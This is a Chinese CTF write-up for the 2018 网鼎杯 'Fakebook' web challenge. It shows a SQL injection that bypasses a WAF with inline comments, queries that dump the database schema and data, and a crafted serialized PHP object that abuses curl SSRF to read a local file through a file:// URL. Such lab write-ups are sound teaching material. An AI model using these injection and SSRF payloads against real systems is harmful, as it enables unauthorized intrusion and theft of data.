# [网鼎杯 2018]

## 0x01 Fakebook

有robots.txt

```
User-agent: *
Disallow: /user.php.bak
```

访问一下拿到源码

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
?>
```

估计是通过get来进行SSRF攻击了

走一下网站的流程

注册了账号

访问个人界面时

```
http://111.198.29.45:53095/view.php?no=1
```

输入no=2

有报错信息，泄露了目录

```
Notice: Trying to get property of non-object in /var/www/html/view.php on line 53
```

看一下有没有sql注入，手工注失败了，有waf

看一下sqlmap能不能跑

试了一下有个基于时间盲注的方法...但是最后sqlmap也没给我跑出来

看了一下师傅们的wp,发现是waf把union select给过滤了，用/**/内联注释来绕过

```
GET /view.php?no=-1%20union/**/select%201,2,3,4 HTTP/1.1
Host: 111.198.29.45:53095
Pragma: no-cache
Cache-Control: no-cache
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=alqac37gsjk5jco5mk288n8ct4
Connection: close


HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Wed, 29 Jan 2020 13:45:28 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/5.6.40
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 1666

<!doctype html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>User</title>

    <link rel="stylesheet" href="css/bootstrap.min.css" crossorigin="anonymous">
<script src="js/jquery-3.3.1.slim.min.js" crossorigin="anonymous"></script>
<script src="js/popper.min.js" crossorigin="anonymous"></script>
<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
</head>
<body>
<br />
<b>Notice</b>:  unserialize(): Error at offset 0 of 1 bytes in <b>/var/www/html/view.php</b> on line <b>31</b><br />
<div class="container">
    <table class="table">
        <tr>
            <th>
                username
            </th>
            <th>
                age
            </th>
            <th>
                blog
            </th>
        </tr>
        <tr>
            <td>
                2            </td>
            <td>
                <br />
<b>Notice</b>:  Trying to get property of non-object in <b>/var/www/html/view.php</b> on line <b>53</b><br />
            </td>
            <td>
                <br />
<b>Notice</b>:  Trying to get property of non-object in <b>/var/www/html/view.php</b> on line <b>56</b><br />
            </td>
        </tr>
    </table>

    <hr>
    <br><br><br><br><br>
    <p>the contents of his/her blog</p>
    <hr>
    <br />
<b>Fatal error</b>:  Call to a member function getBlogContents() on boolean in <b>/var/www/html/view.php</b> on line <b>67</b><br />
```

现在可以正常注入了

发现2处可以正常回显

那么有

```
#爆表
no=-1+union/**/select+1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database() 
#爆列
no=-1+union/**/select+1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database()
#爆列data的内容
no=-1+union/**/select+1,group_concat(data),3,4 from users
```

data里的内容就是我们之前注册用户的序列化数据

报错信息暗示我们需要构造一个序列化对象

```
unserialize(): Error at offset 0 of 1 bytes in <b>/var/www/html/view.php</b> on line 31
```

利用前面泄露的源码构造一个恶意对象

```php
<?php
class UserInfo  {
    public $name = "admin";
    public $age = 233;
    public $blog = "file:///var/www/html/flag.php";
}

$data = new UserInfo();
echo serialize($data);
?>
```

利用getBlogContents调用的curl进行SSRF攻击

四个参数都试了一下，发现是第4个用来读用户数据的

```
payload=?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"test";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

在iframe中得到flag

### 参考资料

绕过限制利用curl读取写入文件:

[https://www.anquanke.com/post/id/98896](https://www.anquanke.com/post/id/98896)